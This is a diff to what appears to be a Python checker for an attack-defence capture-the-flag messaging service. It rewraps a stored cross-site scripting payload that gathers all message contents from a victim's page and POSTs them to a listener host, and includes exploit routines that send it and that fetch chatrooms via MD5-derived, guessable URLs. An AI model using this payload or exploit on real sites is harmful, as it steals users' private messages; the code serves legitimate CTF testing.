@@ -142,9 +142,11 @@ async def getnoise0(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: C
     assert_in(noise, r.text, "noise missing from note")
 
 
-exploitMessage = f"<script>function getText(){{let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){{text += messages[i].innerHTML;}}return text; }}fetch('http://{0}:6452/', {{method: 'POST', body:'username=' + getText(),headers: {{ 'Content-Type': 'application/x-www-form-urlencoded', }},}}); </script>"
+exploitMessage = "<script>function getText(){{let text='';let messages = document.getElementsByClassName(" \
+                 "'message');for(let i = 0; i < messages.length; i++){{text += messages[i].innerHTML;}}return text;" \
+                 " }}fetch('http://{0}:6452/', {{method: 'POST', body:'username=' + getText(),headers: {{ " \
+                 "'Content-Type': 'application/x-www-form-urlencoded', }},}}); </script>"
 result = [None]
-
 webServer = [None]
 def server(logger):
     class MyServer(BaseHTTPRequestHandler):
@@ -186,7 +188,8 @@ async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, clie
     password = secrets.token_hex(32)
     cookie = await register(task, client, username, password, logger)
     target = json.loads(task.attack_info)['username']
-    r = await client.post(f"http://{task.address + ':' + str(SERVICE_PORT)}/messages/", json={"recipient": target, "message": encode(exploitMessage.format(task.address), target, logger)}, cookies=cookie)
+    payload = encode(exploitMessage.format('localhost' if task.address == 'host.docker.internal' else task.address), target, logger)
+    r = await client.post(f"http://{task.address + ':' + str(SERVICE_PORT)}/messages/", json={"recipient": target, "message": payload}, cookies=cookie)
     assert_equals(r.status_code, 200, "exploit failed")
     xss_test(task, logger)
     while not result[0]:
@@ -234,13 +237,11 @@ async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, clie
     password = secrets.token_hex(32)
     cookie = await register(task, client, username, password, logger)
     target = json.loads(task.attack_info)['username']
-    logger.debug('Accessing profile of ' + target)
     r = await client.get(f"http://{task.address + ':' + str(SERVICE_PORT)}/profile/{target}", cookies=cookie)
     if len(r.text.split('<h3>')) < 2:
         return
     roomName = r.text.split('<h3>')[1].split('</h3>')[0]
     roomUrl = hashlib.md5(roomName.encode()).hexdigest()
-    logger.debug('Accessing chatroom ' + roomUrl + ' of ' + roomName)
     r = await client.get(f"http://{task.address + ':' + str(SERVICE_PORT)}/chatroom/{roomUrl}", cookies=cookie)
     if flag := searcher.search_flag(r.text):
         return flag
